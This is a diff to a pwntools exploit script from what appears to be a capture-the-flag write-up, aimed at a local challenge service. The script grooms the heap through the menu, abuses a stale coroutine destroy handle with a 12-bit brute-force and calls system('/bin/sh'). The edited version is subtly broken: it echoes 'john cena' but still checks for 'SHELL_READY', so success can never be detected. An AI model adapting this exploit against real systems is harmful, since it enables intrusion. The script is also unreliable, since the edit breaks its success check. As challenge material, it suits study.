@@ -735,52 +735,49 @@ With a 12-bit bruteforce we can successfully trigger a call to `system("/bin/sh"
 
 
 ```python
-#!/usr/bin/env python3
 from pwn import *
 
-context.log_level = "error"
-libc = ELF("./libc.so.6", checksec=False)
+libc = ELF("./libc.so.6")
 
-HOST = args.HOST or "127.0.0.1"
-PORT = int(args.PORT or 1338)
-ATTEMPTS = int(args.ATTEMPTS or 20000)
+HOST = "127.0.0.1"
+PORT = 1338
+ATTEMPTS = 20000
 
 BASE_LOW = 0x000000
 
 
 def attempt():
-    io = remote(HOST, PORT)
+    r = remote(HOST, PORT)
     try:
         commands = [b"1\n1\n"] * 18
         commands += [f"3\n{ticket}\n".encode()
                      for ticket in range(1, 18)]
         commands += [b"4\n"] * 17
 
-        # Ticket 17: coroutine index 2 -> 1
-        commands += [b"2\n17\n-23\n1\n4\n"]
+        commands += [b"2\n17\n-23\n1\n4\n"] # ticket 17: coroutine index 2 -> 1
 
-        # Free 16 fillers and then the first copy of the target handle
+        # we free 16 fillers and then the first copy of the target handle
         commands += [b"4\n"] * 17
 
-        # Reclaim part of the target's 0x90 chunk with a 112-byte request
+        # reclaim part of the target's 0x90 chunk with a 112-byte request
         commands += [b"7\n112\n"]
 
-        io.send(b"".join(commands))
-        io.recvuntil(b"Feedback: ")
+        r.send(b"".join(commands))
+        r.recvuntil(b"Feedback: ")
 
         system_low = (BASE_LOW + libc.sym.system) & 0xffffff
-        io.send(b"/bin/sh\0" + p32(system_low)[:3])
-        io.recvuntil(b"Feedback recorded.")
+        r.send(b"/bin/sh\0" + p32(system_low)[:3])
+        r.recvuntil(b"Feedback recorded.")
 
-        # Shop destruction dispatches through the stale destroy slot.
-        io.sendline(b"8")
-        io.recvuntil(b"What a waste of food... shame on you!")
-        io.sendline(b"printf 'SHELL_%s\\n' READY")
-        if b"SHELL_READY" in io.recvuntil(b"SHELL_READY", timeout=1):
-            return io
+        # trigger handle.destroy()
+        r.sendline(b"8")
+        r.recvuntil(b"What a waste of food... shame on you!")
+        r.sendline(b"echo 'john cena'")
+        if b"SHELL_READY" in r.recvuntil(b"john cena", timeout=1):
+            return r 
     except EOFError:
         pass
-    io.close()
+    r.close()
     return None
 
 
